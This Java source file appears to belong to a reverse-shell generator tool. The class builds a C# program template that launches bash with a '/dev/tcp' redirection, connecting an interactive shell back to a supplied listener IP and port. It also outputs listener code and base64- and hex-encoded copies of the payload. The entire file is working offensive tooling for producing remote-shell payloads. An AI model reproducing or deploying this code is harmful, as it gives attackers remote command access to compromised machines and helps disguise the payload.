package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class C_Bashi extends Reverse {

    protected String shellFormat = "";

    public C_Bashi(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n\tpublic static void Main(string[] args) {\n\t  Process proc = new System.Diagnostics.Process();\n\t  proc.StartInfo.FileName = \"%s\";\n\t  proc.StartInfo.Arguments = \"-c \\\"%s -i >& /dev/tcp/%s/%S 0>&1\\\"\";\n\t  proc.StartInfo.UseShellExecute = false;\n\t  proc.StartInfo.RedirectStandardOutput = true;\n\t  proc.Start();\n\n\t  while (!proc.StandardOutput.EndOfStream) {\n\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());\n\t  }\n\t}\n  }\n}\n",this.getShell(), this.getShell(), this.getLocalIP(), this.getLocalPort());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 
    